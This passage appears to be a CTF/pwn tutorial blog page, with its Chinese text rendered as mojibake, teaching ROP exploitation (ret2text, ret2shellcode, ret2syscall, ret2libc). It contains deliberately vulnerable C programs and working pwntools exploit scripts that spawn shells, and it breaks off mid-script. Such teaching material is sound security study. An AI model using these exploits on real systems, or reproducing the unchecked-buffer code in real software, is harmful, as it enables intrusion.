title="ELFæ–‡ä»¶æ“ä½œ"></a>ELFæ–‡ä»¶æ“ä½œ</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/mnt/d/myCTFground/Pwn/Signin/ez_stack&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ipythonæˆ–è€…log_level &#x3D; â€˜debugâ€™ çš„è¯å°±ç›¸å½“äºæ˜¯checksecäº†ï¼Œ</p><p>æˆ‘ä»¬åŠ è½½elfæ–‡ä»¶ä¸»è¦æ˜¯ä¸ºäº†è·å–ä¸€äº›ç¬¦å·ä¿¡æ¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.address)</span><br><span class="line"><span class="string">&#x27;0x400000&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x401040&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x404008&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x401040&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>libc = ELF(<span class="string">&#x27;../libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__())</span><br><span class="line"><span class="string">&#x27;0x1b45bd&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="babyROP"><a href="#babyROP" class="headerlink" title="babyROP"></a>babyROP</h2><h3 id="ä»€ä¹ˆæ˜¯ROP"><a href="#ä»€ä¹ˆæ˜¯ROP" class="headerlink" title="ä»€ä¹ˆæ˜¯ROP"></a>ä»€ä¹ˆæ˜¯ROP</h3><p>ç±»ä¼¼äºæ¯”è¾ƒå¸¸å¬åˆ°çš„OOPï¼ˆé¢å‘å¯¹è±¡ç¼–ç¨‹ï¼‰ï¼ŒPOPï¼ˆé¢å‘è¿‡ç¨‹ç¼–ç¨‹ï¼‰ï¼ŒFPï¼ˆå‡½æ•°å¼ç¼–ç¨‹ï¼‰ç­‰ã€‚</p><p>ROPå…¨ç§°æ˜¯Return-Oriented Programingï¼ˆé¢å‘è¿”å›ç¼–ç¨‹ï¼‰ã€‚ç®€å•æ¥è¯´ï¼Œ<strong>ROPå°±æ˜¯å°†æºç¨‹åºä¸­æ•£è½çš„æ±‡ç¼–ç¨‹åºç‰‡æ®µï¼ˆä¹Ÿç§°gadgetï¼‰â€œæ‹¼æ¥â€åœ¨ä¸€èµ·ï¼Œä½¿å…¶èƒ½å¤Ÿä¸ºæ”»å‡»è€…æœåŠ¡</strong>ã€‚ éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼Œæ­¤å¤„çš„â€œæ‹¼æ¥â€ä¸æ˜¯æŒ‡å°†è¿™äº›æ±‡ç¼–ç¨‹åºç‰‡æ®µèšé›†åœ¨æŸä¸ªè¿ç»­çš„å†…å­˜ç©ºé—´ä¸­ï¼Œè€Œæ˜¯è®©å®ƒä»¬åœ¨é€»è¾‘ä¸Šè¿ç»­æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´æ„æˆä¸€ä¸ªâ€è¿”å›é“¾â€œã€‚ROPçš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯åˆ©ç”¨ä»¥retç»“å°¾çš„æŒ‡ä»¤åºåˆ—æŠŠæ ˆä¸­çš„åº”è¯¥è¿”å›EIPçš„åœ°å€æ›´æ”¹æˆæˆ‘ä»¬éœ€è¦çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p><h3 id="ä¸ºä»€ä¹ˆè¦ROP"><a href="#ä¸ºä»€ä¹ˆè¦ROP" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ROP"></a>ä¸ºä»€ä¹ˆè¦ROP</h3><p>ROPä¸»è¦æ˜¯ä¸ºäº†ç»•è¿‡NX(DEP)ä¿æŠ¤ã€‚<strong>NX(DEP)åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢æ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</strong>NXå¼€å¯åï¼Œç›´æ¥å¾€æ ˆä¸Šæˆ–å †ä¸Šæ³¨å…¥ä»£ç çš„æ–¹å¼éš¾ä»¥ç»§ç»­å‘æŒ¥æ•ˆæœï¼Œæ‰€ä»¥æœ‰äº†å„ç§ç»•è¿‡æ–¹æ³•ï¼Œropæ˜¯å…¶ä¸­ä¸€ç§ã€‚</p><p>ropæ”»å‡»ä¸€èˆ¬è¦æ»¡è¶³ï¼š</p><p>1ï¼‰ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚</p><p>2ï¼‰å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„gadgetä»¥åŠå¯¹åº”çš„gadgetåœ°å€ï¼ˆå¦‚æœgadgetæ¯æ¬¡åœ°å€æ˜¯ä¸å›ºå®šçš„ï¼Œå°±è¦æƒ³åŠæ³•åŠ¨æ€è·å–å¯¹åº”åœ°å€äº†ï¼‰</p><h3 id="åŸºæœ¬ROP"><a href="#åŸºæœ¬ROP" class="headerlink" title="åŸºæœ¬ROP"></a>åŸºæœ¬ROP</h3><h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>ret2textï¼ˆret to textï¼‰å®é™…ä¸Šå°±æ˜¯ä¸€ç§ROPï¼Œåªä¸è¿‡åªè¿”å›ä¸€æ¬¡è€Œå·²ï¼ˆè¿”å›åˆ°textä¸Šï¼‰ï¼Œret2textæœ¬è´¨å°±æ˜¯æ§åˆ¶retè¿”å›åˆ°å·²æœ‰çš„ä»£ç ä¸Šå¦‚ï¼šsystem(â€œ&#x2F;bin&#x2F;shâ€)ï¼Œ execv(â€œ&#x2F;bin&#x2F;shâ€)ï¼Œä»è€Œgetshellã€‚</p><p>å†™äº†ä¸€ä¸ªç®€å•çš„ç¨‹åºä½œä¸ºä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PSï¼šç¼–è¯‘æ—¶è®°å¾—å…³æ‰canaryå’Œåœ°å€éšæœºåŒ–</strong></p><p>å»ºè®®ç›´æ¥åœ¨wslé‡Œç¼–è¯‘å°±å¥½ï¼ˆæ‡’å¾—å¼€è™šæ‹Ÿæœºæ~ï¼‰</p><p><code>gcc -o pwn -fno-stack-protector -no-pie pwn.c</code></p><p>scanfå¤„æ²¡æœ‰å¯¹è¯»å–æ•°æ®é•¿åº¦åšæ£€æµ‹ï¼Œå­˜åœ¨æº¢å‡º</p><p>ä¸è¿‡ç›´æ¥è¯´å¯èƒ½ä¸å¥½ç†è§£ï¼Œçœ‹ä¸€ä¸‹idaå§</p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_main.png" alt="main"></p><p>æ ˆç©ºé—´ï¼š</p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_stack.png" alt="stack"></p><p>æ˜¾ç„¶è¿™é‡Œè¾“å…¥åˆ°äº†v4(å¯¹åº”åˆ°æ ˆé‡Œé¢çš„var_30)ï¼Œå‘ç°è·Ÿé¢„æƒ³çš„0x20ä¸ä¸€æ ·ï¼Œå·å·åŠ äº†ä¸€äº›ç©ºé—´ï¼Œè€Œä¸”å¤šåˆ›å»ºäº†ä¸€ä¸ªä¸çŸ¥é“å¹²ä»€ä¹ˆçš„intå˜é‡ã€‚ä½¿ç”¨å®é™…è¦å¡«å……çš„é•¿åº¦åº”è¯¥æ˜¯</p><p><code>offset = 0x2c + 0x4 + 0x8 = 0x38</code></p><p>è¿™é‡Œçš„0x2cæ˜¯var_30çš„å¤§å°ï¼ˆå¯ä»¥çœ‹åˆ°å·¦è¾¹ä¸€åˆ—æ•°é‚£é‡Œ0x30å’Œ4ç›¸å·®äº†0x2cï¼ˆä¸æ˜¯26å—·ï¼‰ï¼‰ï¼›</p><p>ç„¶å4ä¸ªå­—èŠ‚é•¿åº¦æ˜¯var_4ï¼Œä¹Ÿå°±æ˜¯é‚£ä¸ªintå˜é‡çš„ï¼Œè¿™é‡Œæ˜¯ç›´æ¥è¦†ç›–è¿‡å»äº†ï¼›</p><p>ç„¶ååé¢çš„8ä¸ªå­—èŠ‚æ˜¯rbpï¼ˆi386å°±æ˜¯4ä¸ªå­—èŠ‚ï¼ˆebpï¼‰ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°så’Œré‚£é‡Œç›¸å·®äº†8ï¼›</p><p>ç„¶åå†è¦†ç›–æ–°çš„è¿”å›åœ°å€ï¼ˆå¦‚æœæœ‰åé—¨å‡½æ•°å°±è¿”å›åˆ°é‚£é‡Œå°±å¥½äº†ï¼‰</p><p>å†ä¸€çœ¼åé—¨å‡½æ•°</p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_binsh.png" alt="binsh"></p><p>å‘ç°&#x2F;bin&#x2F;shå­—ç¬¦ä¸²åœ¨0x401144ä¼ å‚ï¼Œæ‰€ä»¥å°±è¿”å›åˆ°0x401144ï¼Œäºæ˜¯å†™å‡ºexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0x401144</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><p>å³æ§åˆ¶ç¨‹åºæ‰§è¡Œshellcodeä»£ç ï¼ŒshellcodeæŒ‡çš„æ˜¯ç”¨äºå®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œå¸¸è§çš„åŠŸèƒ½ä¸»è¦æ˜¯è·å–ç›®æ ‡ç³»ç»Ÿçš„shellã€‚<strong>ä¸€èˆ¬æ¥è¯´ï¼Œshellcodeè¦æˆ‘ä»¬è‡ªå·±å¡«å……ã€‚</strong></p><p>åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œè¦æ‰§è¡Œshellcodeï¼Œéœ€è¦shellcodeæ‰€åœ¨åŒºåŸŸæœ‰å¯æ‰§è¡Œæƒé™ã€‚ï¼ˆæ²¡æœ‰NXä¿æŠ¤ï¼Œæˆ–è€…ç”¨mprotectï¼ˆï¼‰ä¸ºä¸€æ®µåŒºåŸŸèµ‹äºˆäº†å¯æ‰§è¡Œæƒé™ï¼Œæˆ–è€…bssæ®µå¯æ‰§è¡Œï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    mprotect(<span class="number">0x401000</span>, <span class="number">0x1000</span>, <span class="number">7</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(<span class="number">0x401000</span>, buf);</span><br><span class="line">    ((<span class="type">void</span>(*)())<span class="number">0x401020</span>)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å°±æ˜¯æŠŠ0x401000å¼€å§‹çš„é•¿åº¦ä¸º0x1000çš„åŒºåŸŸæ ‡è®°ä¸ºå¯æ‰§è¡Œï¼Œæˆ‘ä»¬ç›´æ¥æŠŠshellcodeä¼ è¿›å»ï¼Œå³å¯getshellï¼Œç”±äºcopyå‘ç”Ÿåœ¨0x401000ï¼Œä½†æ˜¯ä»0x401020å¼€å§‹æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆå¡«å……0x20å„å­—èŠ‚å†å¡«å……shellcode</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>ç®€å•æ¥è¯´å°±æ˜¯æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ¥å®ç°æƒ³è¦å®ç°çš„åŠŸèƒ½ï¼Œæ¯”å¦‚å¯ä»¥ç”¨ <code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code> ç³»ç»Ÿè°ƒç”¨æ¥è·å–shellï¼Œè¿™éœ€è¦æ»¡è¶³ï¼š</p><ul><li><p>ç³»ç»Ÿè°ƒç”¨å·ï¼Œeax ä¸º 0xb(x86) &#x2F; rax ä¸º 0x3b(x64)</p></li><li><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œebx &#x2F; rdi ä¸º &#x2F;bin&#x2F;sh åœ°å€</p></li><li><p>ç¬¬äºŒä¸ªå‚æ•°ï¼Œecx ä¸º 0 &#x2F; rsi ä¸º 0</p></li><li><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œedx ä¸º 0 &#x2F; rdx ä¸º 0</p></li><li><p>æœ€åè¿”å› int 0x80(x86) &#x2F; syscall ret(x64)</p><p>çœ‹ä¸€é“ä¾‹é¢˜ï¼š<a href="../resources/pwn_asset/study/ret2sys_64" target="_blank">ret2sys_64</a></p></li></ul><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2sys_main.png" alt="main"></p><p>ç¨‹åºé‡Œé¢æ²¡æœ‰ç°æˆçš„&#x2F;bin&#x2F;shï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä¸¤æ¬¡ç³»ç»Ÿè°ƒç”¨ï¼Œä¸€æ¬¡è¯»å­—ç¬¦ä¸²ï¼Œä¸€æ¬¡æ‹¿sh</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2sys_64&#x27;</span>)</span><br><span class="line">rax = <span class="number">0x46b9f8</span></span><br><span class="line">rdi = <span class="number">0x4016c3</span></span><br><span class="line">rdx_rsi = <span class="number">0x4377f9</span></span><br><span class="line">syscall = <span class="number">0x45bac5</span></span><br><span class="line">bss = <span class="number">0x6c1c60</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span></span><br><span class="line"><span class="comment"># è°ƒç”¨sys_readï¼Œç”¨æ¥è¯»å–åé¢è¾“å…¥çš„/bin/shåˆ°bssæ®µ</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0</span>) + p64(rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0x10</span>) + p64(bss) + p64(syscall)</span><br><span class="line"><span class="comment"># è°ƒç”¨execveæ¥getshell</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0x3b</span>) + p64(rdi) + p64(bss)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;system_x64&#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>å½“ä¸çŸ¥é“é¢˜ç›®libcç‰ˆæœ¬<del>ï¼ˆç°åœ¨çš„ctfåº”è¯¥ä¸ä¼šè¿˜æœ‰æ¯”èµ›ä¸ç»™libcå§ï¼Œä¸ä¼šå§ä¸ä¼šå§~ï¼‰</del>ï¼Œå¹¶ä¸”å­˜åœ¨è¶³å¤Ÿçš„æº¢å‡ºç©ºé—´ï¼Œæ˜¯å¯ä»¥é€šè¿‡æ³„éœ²å‡½æ•°åœ°å€ï¼ˆå®é™…ä¸Šåªéœ€è¦ä½ä¸‰ä½æ•°å­—ï¼‰æ¥æŸ¥æ‰¾libcç‰ˆæœ¬ï¼Œ<strong>å½“ç„¶çŸ¥é“libcç‰ˆæœ¬å¯èƒ½ä¹Ÿä¼šéœ€è¦leakåŸºåœ°å€æ¥è®¡ç®—systemç­‰å‡½æ•°çš„åœ°å€</strong></p><p>è¿™é‡Œå»ºè®®ä½¿ç”¨pyçš„LibcSearcheråº“ï¼Œè¿™ä¸ªåº“æ˜¯åœ¨çº¿æŸ¥æ‰¾çš„ï¼ˆä¹Ÿå°±æ˜¯è¦è”ç½‘ï¼‰ï¼Œ<del><em>ä¹Ÿå¯ä»¥æœ¬åœ°ä¸€ä¸ªä¸€ä¸ªè¯•</em></del></p><p>ret2libcçš„æ€è·¯æ˜¯å¯»æ‰¾ç¨‹åºä¸­çš„gadgetæ„é€ ROPï¼Œæ¥è°ƒç”¨ç¨‹åºä¸­çš„è¾“å‡ºå‡½æ•°å¦‚ï¼šputsï¼Œwriteï¼Œæ‰“å°ä¸€äº›å‡½æ•°çš„åœ°å€ï¼Œä»è€Œè¾¾åˆ°æ³„éœ²åŸºåœ°å€çš„ç›®çš„</p><p><strong>ä¾‹é¢˜ï¼š</strong><a href="../resources/pwn_asset/study/ret2libc_x64" target="_block">MoeCTF2022_ret2libc</a></p><p>åœ¨vulnå‡½æ•°é‡Œé¢å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ ˆæº¢å‡ºï¼Œæº¢å‡ºé•¿åº¦è¶³å¤Ÿæ„é€ ROP</p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_vuln.png" alt="vuln"></p><p>è¦†ç›–çš„é•¿åº¦ä¸º0x40+0x8ï¼ˆrbpï¼‰&#x3D;0x48</p><p>ç„¶åç”±äºx64å‰å…­ä¸ªå‚æ•°ç”¨å¯„å­˜å™¨ä¼ ï¼Œå¤šçš„æ‰æ˜¯å’Œx86ä¸€æ ·æ ˆä¼ å‚ï¼Œè¿™å‰å…­ä¸ªå‚æ•°ä¾æ¬¡ç”¨rdiï¼Œrsiï¼Œrcxï¼Œrdxï¼Œr8ï¼Œr9å¯„å­˜å™¨</p><p>è¿™é‡Œæˆ‘ä»¬ç›®çš„æ˜¯é€šè¿‡putså‡½æ•°æ¥è¾“å‡ºputsçš„gotè¡¨ä¸­çš„åœ°å€æ¥æ³„éœ²putsçš„çœŸå®åœ°å€ã€‚</p><p>æ‰€ä»¥è¦æŠŠputs_gotä½œä¸ºå‚æ•°ä¼ è¿›putså‡½æ•°é‡Œï¼Œä¹Ÿå°±æ˜¯è¦ç”¨åˆ°rdiå¯„å­˜å™¨ã€‚<strong>ï¼ˆæ‰¾gadgetå¯ä»¥ç”¨ROPgadgetï¼‰</strong></p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_rdi.png" alt="findrdi"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdi = <span class="number">0x40117e</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># .gotæŒ‡å‘å‡½æ•°åœ¨libcçš„çœŸå®åœ°å€</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># ä¹Ÿå¯ä»¥elf.sym[&#x27;puts&#x27;]ï¼Œå› ä¸º.pltå­˜çš„å°±æ˜¯å‡½æ•°çš„ç¬¦å·ä¿¡æ¯</span></span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># ä¹Ÿå¯ä»¥å¡«vulnå‡½æ•°åœ°å€ï¼Œåªè¦ä¿è¯å†ç”¨ä¸€æ¬¡readå°±è¡Œ</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ¥æ”¶æ‰“å°çš„åœ°å€ï¼Œåœ¨æŸ¥æ‰¾libcç‰ˆæœ¬ï¼Œç„¶åè®¡ç®—systemï¼Œå­—ç¬¦ä¸²&#x2F;bin&#x2F;shçš„åœ°å€ï¼Œå°±å¯ä»¥æ„é€ ç¬¬äºŒä¸ªpayload</p><p><strong>è¦æ³¨æ„ï¼šubuntu18ä»¥ä¸Šç‰ˆæœ¬è°ƒç”¨ç³»ç»Ÿå‡½æ•°è¦æ ˆå¯¹é½ï¼Œä¸€èˆ¬åœ¨ä¼ å‚å‰åŠ ä¸ªretçš„gadgetå°±è¡Œ</strong></p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_ret.png" alt="findret"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) <span class="comment"># è¿™ä¹ˆå†™æ˜¯å› ä¸ºä¸€èˆ¬ä»¥\x7fç»“å°¾çš„6ä¸ªå­—èŠ‚</span></span><br><span class="line"></span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">libc = get_libc(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">å¦‚æœæ˜¯ç»™äº†ä½ libcæ–‡ä»¶ï¼Œæœ¬åœ°åŠ è½½æ—¶ç”¨ELF()å°±è¡Œï¼Œç”¨æ³•è‡ªç„¶è·Ÿä¸Šé¢LibcSearcherçš„ä¸ä¸€æ ·</span></span><br><span class="line"><span class="string">example:</span></span><br><span class="line"><span class="string">libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="string">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">sys_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(b&#x27;/bin/sh&#x27;).__next__() @py3</span></span><br><span class="line"><span class="string">#libc.search(&#x27;/bin/sh&#x27;).next() @py2</span></span><br><span class="line"><span class="string">py3ä¸­search()çš„å‚æ•°å¿…é¡»æ˜¯bytesï¼Œç„¶ånextæ–¹æ³•å¤šäº†ä¸‹åˆ’çº¿</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(ret) + p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br></pre></td></tr></table></figure><p><strong>å®Œæ•´exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 